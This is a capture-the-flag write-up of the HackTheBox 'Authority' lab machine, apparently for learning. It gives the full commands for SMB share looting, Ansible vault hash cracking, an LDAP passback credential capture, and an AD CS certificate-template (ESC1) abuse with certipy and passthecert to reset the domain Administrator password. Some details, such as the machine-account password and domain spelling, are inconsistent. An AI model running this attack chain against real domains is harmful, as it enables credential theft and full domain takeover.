### DNS enumeration:

As port 53 was open and a DNS server was running, I conducted DNS enumeration to gather more information.

Checked for the DNS details:

```bash
dig htb.corp any @10.10.11.222
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ffba9a9a-1624-4b30-a0a1-bf642f304029)

Verified the nameserver, which revealed "authority.htb.corp" as the authoritative server for the domain:

```bash
dig htb.corp any @10.10.11.222 -t NS
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/1804fb57-14d7-4197-b134-9d15487af72f)

```bash
dig axfr htb.corp any @10.10.11.222
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c129e868-3a24-4a36-9980-c45795421f2d)

In the end, DNS enumeration didn't reveal any significant findings.

### Web Enumeration:

Since the DNS enumeration didn't yield substantial results, I proceeded to check the web services on the open ports 80 and 443.

I performed sub-domain and directory enumeration on both the domains, but the results were unremarkable. The web server on these ports appeared to be Microsoft IIS.

I then moved on to explore port 8443 and discovered an application called "PWM," running on version "v2.0.3 bc96802e." A Google search revealed that "PWM is an open source password self-service application for LDAP directories."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5721689b-1632-409b-ad65-909447334abd)

### SMB enumeration

Since port 445 is open and running, I proceeded to enumerate the SMB shares on the target machine. I discovered one share named "Development," where I have read access as a guest user.

```bash
smbmap -H "htb.corp" -s Development -u 'DoesNotExist'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/bd418dfb-e193-44c9-b8bd-2c1d2035dd33)

Within the "Development" share, I found files related to automation and the PWM configuration.

```bash
smbmap -H "htb.corp" -R "Development" -u 'DoesNotExist'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/051ce1f1-73fd-4eeb-9236-4eced8c1c46b)

I connected to this share and downloaded all the files to my attacker machine.

```bash
smbclient \\\\htb.corp\\Development -U 'Guest'

smb: \> prompt off
smb: \> recurse on
smb: \> mget *
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/62465e43-1b8d-4a34-8982-0cf9625a46dd)

In the "ansible.cfg" file, I observed a remote user named "svc_pwm."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a690bc9a-c303-4336-b3bb-1abd19b92491)

In another file named "ansible_inventory," I found some credentials for WinRM associated with the user "Administrator."

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d9ca85e7-7ec1-4e8c-a4ca-cd597852123f)

Upon trying the discovered credentials, I didn't find a successful login. However, I continued my investigation and found ANSIBLE hashes in the following directory:

```
Automation/Ansible/PWM/defaults
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c67ebf59-7182-4ca7-87ec-f02238cc1e70)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Now that we have the ANSIBLE hashes, we can proceed to crack them using John the Ripper. To convert the hashes into John the Ripper format, we can use the ansible2john.py script for each of the three hashes.

```bash
ansible2john.py ansible.yml > ansi #we can do the same for other 2 hashes as well.
```

I created 3 files for 3 different hashes to convert & crack using John.

After converting the format, we can crack the hashes using the following command with John the Ripper:

```bash
john ansi -w=/usr/share/wordlists/rockyou.txt
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0ef666a1-c546-44d0-bd1f-5352b08e78ab)

Once the cracking is complete, we can extract the password from the cracked hash. This password can be used to decrypt the secrets in the ANSIBLE files. we can use the following command to decrypt the ANSIBLE files using the extracted password as referred from this [blog](https://www.shellhacks.com/ansible-vault-encrypt-decrypt-string/):

```bash
cat ansible1.yml | ansible-vault decrypt
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f56ad7b8-093f-4f28-a7df-45d83eff6d30)

During the login process, I encounter an error when entering wrong credentials, revealing another host running inside the Authority box. I added this host to my hosts file for further investigation.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc35f556-f9a7-4f41-8a7d-c883caf57080)

Proceeding further, I accessed the configuration manager page successfully using one of the extracted credentials from the Ansible vault. 🙂

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c54e38a2-6134-49b7-8810-f635a06d0667)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## User access:

After successfully logging into the configuration manager, I explored its functionalities and came across some interesting options in the LDAP directory connection settings. Notably, I noticed that there are saved credentials in the LDAP proxy vault.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/37f5490c-1d4b-430c-bc3b-6e9d482edba8)

Furthermore, there is an option to test the LDAP URL. This scenario reminded me of a technique I learned about nearly a year ago, known as the [LDAP passback attack](https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210).

To proceed with the attack, I set up a rogue LDAP server on my host, utilizing OpenLDAP. Additionally, I started **tcpdump** to listen for all incoming connections on port 389:

```bash
sudo tcpdump -SX -i tun0 tcp port 389
```
Next, I added my IP to the test LDAP URL section within the configuration manager and clicked on "Test LDAP profile." Shortly after clicking, I started receiving packets, and within one of them, I discovered a user named "svc_ldap" along with its plaintext credentials:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/afb75451-1e2d-4c1e-b379-c655ed9aca65)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dcb93f11-f029-409f-b7fa-99fbea49b478)

Using these credentials, I attempted to log in via the WinRM protocol, and I successfully gained access. Additionally, after logging in with the "**svc_ldap**" account, I retrieved the user flag. (pwn3d!🙂)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

For the privilege escalation phase, I began by enumerating the directories and discovered a directory named "certs" in "C:". Given the name of the box is "Authority," this directory hinted towards certificate authority templates, which could be potentially exploited to escalate privileges or impersonate users.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9fa0fe59-431b-44a5-b65d-2f497d7b90c5)

I utilized the binary "[Certify.exe](https://github.com/GhostPack/Certify)" to check for all available vulnerable certificates. The search revealed one certificate named "Corpvpn," which seemed exploitable.

```PS
.\Certify.exe find /vulnerable
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d27cfafb-6331-49b0-8048-fe78f0de4baf)

From the [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1) website, I learned that the "ENROLLEE_SUPPLIES_SUBJECT" flag allows the certificate requester to define the subject details, typically used for identification purposes, such as the common name, organization, and other attributes.

This indicated that we could potentially add a new computer account in Active Directory using the credentials of a domain user. To accomplish this, I used the "[Impacket-addcomputer](https://tools.thehacker.recipes/impacket/examples/addcomputer.py)" tool.

```bash
impacket-addcomputer 'authority.htb/svc_ldap:<password_here>' -method LDAPS -computer-name 'FXI' -computer-pass 'Password1@'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dd5dde22-1951-48dd-81a6-cf4c30cd07e5)

After creating the new machine account, I verified its active status in AD using CrackMapExec.

```bash
crackmapexec smb 10.10.11.222 -u "FXI$" -p 'Password1@' -d auhtority.htb
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/70d6afd7-69ed-4a8b-a389-656f5d3a25bb)

Now using Certipy, I generated a certificate using the computer account "**FXI$**" with the password "**Passw0rd1!**" and the template "**CorpVPN**," enabling privilege escalation.

However, during the certificate generation, I encountered two errors:
```
- Unknown DCE RPC fault status code: 00000721
- The NETBIOS connection with the remote host timed out.
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c12fdaa6-90cf-4ffc-8393-f7bbfeb7168d)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/25b1f41b-f848-4370-b0ee-2d55feccea66)

To resolve this issue, I added the DC IP address to the DNS configuration IPv4 address.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8357c9f6-7b51-41fd-b7e4-02e9589be44f)
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/102eaa6a-dbb1-44c0-9294-24609ecfc9dd)

After adding the IP, I restarted the network manager.

```bash
sudo systemctl restart NetworkManager
```

Upon retrying the certificate generation, I was successful in obtaining the certificate.

```bash
certipy req -u 'FXI$' -p 'Password1@' -dc-ip 10.10.11.222 -ca AUTHORITY-CA -template 'CorpVPN' -upn 'administrator@authority.htb'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/664177ed-09ca-48cf-9030-e425e1e3bf8d)

Subsequently, I generated two additional certificates: one without including the private key and another without including the certificate.

```bash
certipy cert -pfx administrator.pfx -nokey -out user.crt

certipy cert -pfx administrator.pfx -nocert -out user.key
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c392f25e-d3e5-49bc-ad6a-2058ebe45edd)

Using the tool "[PassTheCert](https://github.com/AlmondOffSec/PassTheCert)" found in this [blog](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html), I reset the administrator password using our certificates.

```bash
python3 passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/53118f62-b00a-4ec1-b9af-76bb9d8f0bdb)

After the password reset, I verified the new credentials using CrackMapExec, confirming that I had access to the Administrator account.

```bash
crackmapexec smb 10.10.11.222 -u "Administrator" -p 'OHmxaa5pHwIufhIWtGIBitBKllG5hnmb' -d auhtority.htb
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b9bbd72f-8ca7-4ea5-8c20-46f42f3e729a)

Using these credentials I finally logged into the Administrator account & got the root flag finally. (pwn3d!🙂)





